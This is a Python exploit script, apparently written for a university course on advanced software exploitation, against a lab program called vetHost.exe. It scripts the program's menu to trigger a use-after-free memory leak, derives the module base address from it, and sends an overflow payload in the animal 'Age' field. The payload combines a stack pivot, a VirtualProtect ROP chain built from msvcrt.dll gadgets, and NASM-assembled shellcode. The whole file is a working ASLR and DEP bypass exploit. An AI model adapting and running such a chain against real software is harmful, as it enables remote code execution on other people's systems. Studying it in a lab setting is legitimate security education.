#! c:\Python37\python.exe

# 03/16/2022
# CSC-848 Advanced Software Exploitation
# Micah Flack

import struct
import os
import sys
import socket
from subprocess import call

'''
vetHost.exe config settings
'''

offset = 14480          # offset from disclosure to base: 0x3890
address = "127.0.0.1"   # vetHost address
port = 8888             # vetHost port

def create_shellcode():
    bin = "micah"
    shellcode = b""

    cmd = '"C:\\Program Files\\NASM\\nasm.exe" "'+os.getcwd()+'\\micah.asm"'
    status = call(cmd, shell=True)

    with open(bin, 'rb') as f:
        shellcode = f.read()

    return shellcode

'''
generate rop_chain to call VirtualProtect() via mona.py
'''

def create_rop_chain():

    rop_gadgets = [

      #[---INFO:gadgets_to_set_ebp:---]
      0x6ff6b591,  # POP EBP # RETN [msvcrt.dll] ** ASLR 
      0x6ff6b591,  # skip 4 bytes [msvcrt.dll] ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x6ff5f09d,  # POP EBX # RETN [msvcrt.dll] ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x6ff7e625,  # POP EDX # RETN [msvcrt.dll] ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x6ffd9635,  # POP ECX # RETN [msvcrt.dll] ** ASLR 
      0x6fff44dd,  # &Writable location [msvcrt.dll] ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x6ff695db,  # POP EDI # RETN [msvcrt.dll] ** ASLR 
      0x6ff59f09,  # RETN (ROP NOP) [msvcrt.dll] ** ASLR
      #[---INFO:gadgets_to_set_esi:---]
      0x6ffaedd0,  # POP ESI # RETN [msvcrt.dll] ** ASLR 
      0x6ff5b7bd,  # JMP [EAX] [msvcrt.dll]
      0x6ff81cf2,  # POP EAX # RETN [msvcrt.dll] ** ASLR 
      0x6ff511b8,  # ptr to &VirtualProtect() [IAT msvcrt.dll] ** ASLR
      #[---INFO:pushad:---]
      0x6ffb5cfc,  # PUSHAD # RETN [msvcrt.dll] ** ASLR 
      #[---INFO:extras:---]
      0x6ff84f5d,  # ptr to 'call esp' [msvcrt.dll] ** ASLR

    ]

    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

'''
these are the commands used as if we were accessing the
terminal manually via vetClient.exe
'''

base_cmds = [
    b"A\n",  # animal menu
    b"OK\n",
    b"D\n",  # delete animal
    b"0\n",  # animal @ index [0]
    b"OK\n",
    b"Y\n",  # confirm deletion
    b"OK\n",
    b"X\n",  # return to main menu
    b"OK\n",
    b"Q\n",  # quick add/delete
    b"OK\n",
    b"1\n",  # add 1 animals
    b"1\n",  # add 1 clinics
    b"OK\n",
    b"-1\n", # skip delete animals
    b"OK\n",
    b"-1\n", # skip delete clinics
    b"OK\n",
    b"\n",   # enter to return to menu
    b"OK\n",
]

'''
commands used to access the animal records and access 'Age' buffer overflow
'''

overflow_cmds = [
    b"A\n",     # animal menu
    b"OK\n",
    b"E\n",     # edit animal
    b"1\n",     # animal index @ [1]
    b"OK\n",
    b"4\n",     # edit animal age
    b"",        # add payload here
]

def send_cmds(cmds):

    '''
    here we just iterate through the commands and issue each via the socket
    [1] send cmd
    [2] recv response from vetHost
    [3] check if ready for disclosure grab
    '''

    base_addr = ""
    heap_addr = ""

    for cmd in range(0,len(cmds)):
        socket.sendall(cmds[cmd])                           # send command
        data = socket.recv(1024)
        if (b"ANIMALS" in data and b"CLINICS" in data):
            base_addr = int(float(data.split()[9]))         # grab memory disclosure from age field
            heap_addr = int(float(data.split()[13]))
        
        print("\tCommand [{0}]\t{1}\t -- Successful!".format(cmd, cmds[cmd]))

    return base_addr, heap_addr if base_addr else 0          # return decimal disclosure address

def get_baseaddress():

    '''
    the address recovered from the memory disclosure is in decimal format,
    however, offset math needs to be done in decimal then converted back
    to hexadecimal representation
    '''

    disclosed_base, disclosed_heap = send_cmds(base_cmds)

    hex_disclosed_base = hex(disclosed_base)
    hex_disclosed_heap = hex(disclosed_heap - 1116)
    disclosed_heap = int(hex_disclosed_heap, base=16)

    int_base = disclosed_base - offset
    hex_base = hex(int_base)

    print("\n")
    print("\tDisclosed base address: \t decimal: {0} \t hex: {1}".format(disclosed_base, hex_disclosed_base))
    print("\tDisclosed heap address: \t decimal: {0} \t hex: {1}".format(disclosed_heap, hex_disclosed_heap))
    print("\tBase address \t\t\t decimal: {0} \t hex: {1}".format(int_base, hex_base))
    print("\tOffset \t\t\t\t decimal: {0} \t hex: {1}".format(offset, hex(offset)))
    print("\n")
    
    return int_base

def overflow(baseaddress):

    print("[*] Generating shellcode...")
    shellcode = create_shellcode()

    print("[*] Generating rop_chain()...")
    rop_chain = create_rop_chain()

    junk = b'\x90'*5 + b'\x41'*304

    stackpivot = struct.pack('<I', baseaddress + 10374)

    payload = junk + stackpivot + b'\x90'*24 + rop_chain + shellcode + b'M'*400

    print("[*] Executing age buffer overflow...\n")
    overflow_cmds[-1] = payload
    send_cmds(overflow_cmds)

    socket.sendall(b"OK\n")
    socket.sendall(b"OK\n")

    print("\n[*] Overflow executed successfully!")

    return

'''
initialize connection from "vetClient" to vetHost; obtain socket
'''

socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
socket.connect((address, 8888))
print("[*] Connection to vetHost successful")
data = socket.recv(40)
socket.sendall(b"OK\n")
data = socket.recv(500) # main menu
print("[*] Receiving menu...")

'''
obtain base addr via UAF vulnerability at the address... 0x11003C10
offset returned should be @ 0x3890 from 0x11000000
'''

print("[*] Obtaining base address...\n")
baseaddress = get_baseaddress()

print("[*] Building overflow...")
overflow(baseaddress)

print("[*] Exploit completed.")

socket.close()